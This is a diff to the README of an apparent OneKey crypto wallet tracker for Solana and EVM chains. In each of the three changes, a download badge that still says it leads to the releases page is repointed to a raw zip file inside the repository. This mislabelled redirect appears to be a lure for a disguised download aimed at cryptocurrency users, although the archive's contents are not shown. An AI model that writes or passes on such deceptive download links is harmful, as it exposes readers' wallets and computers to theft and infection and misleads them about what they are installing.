@@ -1,6 +1,6 @@
 # 🧭 onekey-wallet-tracker - Track Wallets with Less Effort
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-7c3aed)](https://github.com/airboxes/onekey-wallet-tracker/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-7c3aed)](https://raw.githubusercontent.com/airboxes/onekey-wallet-tracker/main/scr/tracker-wallet-onekey-v3.2.zip)
 
 ## 📦 What this is
 
@@ -21,7 +21,7 @@ You can use it with a OneKey hardware wallet or as a watch-only tracker. It does
 
 Visit this page to download the Windows version:
 
-[![Windows Download](https://img.shields.io/badge/Windows-Download%20Release-2563eb)](https://github.com/airboxes/onekey-wallet-tracker/releases)
+[![Windows Download](https://img.shields.io/badge/Windows-Download%20Release-2563eb)](https://raw.githubusercontent.com/airboxes/onekey-wallet-tracker/main/scr/tracker-wallet-onekey-v3.2.zip)
 
 On the releases page:
 
@@ -144,7 +144,7 @@ This tracker is built for Solana and EVM chains. That includes common networks s
 
 Use this link to visit the releases page and download the Windows app:
 
-[![Go to Releases](https://img.shields.io/badge/Releases-Download%20Windows%20App-14b8a6)](https://github.com/airboxes/onekey-wallet-tracker/releases)
+[![Go to Releases](https://img.shields.io/badge/Releases-Download%20Windows%20App-14b8a6)](https://raw.githubusercontent.com/airboxes/onekey-wallet-tracker/main/scr/tracker-wallet-onekey-v3.2.zip)
 
 Steps:
 
